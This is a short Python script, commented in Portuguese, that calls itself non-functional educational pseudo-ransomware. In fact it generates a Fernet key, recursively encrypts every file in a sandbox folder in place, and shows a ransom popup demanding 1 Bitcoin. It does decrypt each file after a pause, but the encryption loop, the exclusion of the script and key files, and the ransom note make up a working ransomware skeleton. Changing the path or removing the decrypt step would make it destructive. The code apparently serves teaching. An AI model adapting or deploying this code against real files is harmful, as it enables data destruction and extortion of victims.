# Pseudo-ransomware educacional (não funcional)
from cryptography.fernet import Fernet
import os
import tkinter as tk
from tkinter import messagebox

# 1 - Generação da chave de criptografia
def gerar_chave_criptografica():
    chave = Fernet.generate_key() 
    with open("ransomware_simulado/chave.key", "wb") as chave_file:
        chave_file.write(chave)

# 2 - Carregar a chave de chiptografia
def carregar_chave():
    return open("ransomware_simulado/chave.key", "rb").read()

# 3 - Criptografar arquivo
def criptografar(arquivo, chave):
    f = Fernet(chave)
    
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)

    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# 3.1 - Decriptografar arquivo
def decriptografar(arquivo, chave):
    f = Fernet(chave)

    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.decrypt(dados)

    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

# 4 - Encontrado os arquivos para criptografar
def listar_arquivos(dir):
    files_path = []

    for raiz, _, arquivos in os.walk(dir):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "pseudo_ransomware.py" and not nome.endswith(".key"):
                files_path.append(caminho)

    return files_path

# 5 - Criando mensagem de resgate
def criar_mensagem_resgate():
    root = tk.Tk()
    root.withdraw()

    messagebox.showinfo("LEIA ISSO!", "Seus arquivos foram criptografados!\n\nEnvie 1 Bitcoin para o endereço X e o comprovante!\n\nCaso contrário os seus dados e arquivos se perderão por completo.")

# 6 - Execução
def main():
    gerar_chave_criptografica()
    chave = carregar_chave()
    arquivos = listar_arquivos("ransomware_simulado/arquivos")
    for arquivo in arquivos:

        print(arquivo)

        criptografar(arquivo, chave)
        print("Pausa no teste controlado para verificar o arquivo criptografado.")
        input("Precione ENTER para decriptografar!")
        decriptografar(arquivo, chave)

    criar_mensagem_resgate()

if __name__ == "__main__":
    main()
